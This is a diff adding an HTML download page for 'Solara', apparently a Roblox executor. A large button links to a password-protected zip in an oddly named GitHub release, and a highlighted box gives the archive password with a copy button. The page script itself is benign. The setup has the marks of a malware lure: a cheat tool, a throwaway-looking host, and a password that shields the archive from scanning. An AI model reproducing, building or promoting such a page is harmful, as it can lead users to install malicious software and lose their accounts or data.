@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Download Solara</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100vh;background:#050308;color:#fff;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 20%,rgba(255,107,74,.5) 0%,transparent 60%);opacity:.35;pointer-events:none;z-index:0}
+.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;gap:32px}
+.brand{display:flex;align-items:center;gap:12px;font-size:15px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.55)}
+.brand-mark{width:36px;height:36px;background:#FF6B4A;color:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;box-shadow:0 0 24px rgba(255,107,74,.5)}
+.card{background:#0a0710;border:1px solid rgba(255,107,74,.2);border-radius:24px;max-width:480px;width:100%;padding:48px 40px;text-align:center;box-shadow:0 32px 80px rgba(0,0,0,.6)}
+h1{font-size:clamp(28px,4vw,38px);font-weight:900;letter-spacing:-.03em;line-height:1.1;margin-bottom:32px;color:#fff}
+.btn{display:flex;align-items:center;justify-content:center;gap:10px;background:#FF6B4A;color:#fff;padding:18px 28px;border-radius:14px;text-decoration:none;font-weight:700;font-size:16px;transition:all .2s;box-shadow:0 8px 24px rgba(255,107,74,.5)}
+.btn:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(255,107,74,.5)}
+.btn svg{width:20px;height:20px}
+.pwbox{margin-top:24px;padding:20px;background:#050308;border:1px solid rgba(255,107,74,.2);border-radius:14px;text-align:left;box-shadow:0 8px 24px rgba(0,0,0,.3)}
+.pwlabel{font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.55);margin-bottom:10px;font-weight:600}
+.pwrow{display:flex;align-items:center;gap:12px;justify-content:space-between;flex-wrap:wrap}
+.pwcode{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:22px;font-weight:800;letter-spacing:.15em;color:#FF6B4A;user-select:all;flex:1;min-width:160px;word-break:break-all;cursor:pointer}
+.pwcopy{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#FF6B4A;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
+.pwcopy:hover{opacity:.88;transform:translateY(-1px)}
+.pwcopy:active{transform:translateY(0)}
+.pwcopy svg{width:14px;height:14px}
+.pwcopy.copied{background:transparent;color:#FF6B4A;border:1px solid #FF6B4A}
+.foot{margin-top:36px;padding-top:24px;border-top:1px solid rgba(255,107,74,.2);font-size:12px;color:rgba(255,255,255,.55);line-height:1.6}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand"><div class="brand-mark">S</div><span>Solara</span></div>
+  <div class="card">
+    <h1>Download Solara</h1>
+    <a class="btn" href="https://github.com/SphereFalcon/wave-dl-solara/releases/download/v-3swxd2/solara.zip">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download .zip
+    </a>
+    <div class="pwbox"><div class="pwlabel">Archive password</div><div class="pwrow"><div class="pwcode" id="pwval" title="Click to copy">K7HZV77Y</div><button type="button" class="pwcopy" onclick="copyPw(this)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg><span>Copy</span></button></div></div>
+    <div class="foot">The file is password protected. Extract using 7-Zip or WinRAR with the password above. © 2026 Solara. Not affiliated with Roblox Corporation.</div>
+  </div>
+</div>
+<script>
+function copyPw(btn){
+  var code=document.getElementById("pwval");
+  if(!code)return;
+  var txt=code.textContent.trim();
+  var done=function(){var orig=btn.innerHTML;btn.innerHTML="✓ Copied";btn.classList.add("copied");setTimeout(function(){btn.innerHTML=orig;btn.classList.remove("copied");},1800);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(function(){fallbackCopy(txt);done();});}
+  else{fallbackCopy(txt);done();}
+}
+function fallbackCopy(txt){
+  var ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";
+  document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e){}
+  document.body.removeChild(ta);
+}
+document.addEventListener("DOMContentLoaded",function(){var p=document.getElementById("pwval");if(p){p.addEventListener("click",function(){var b=document.querySelector(".pwcopy");if(b)copyPw(b);});}});
+</script>
+</body>
+</html>
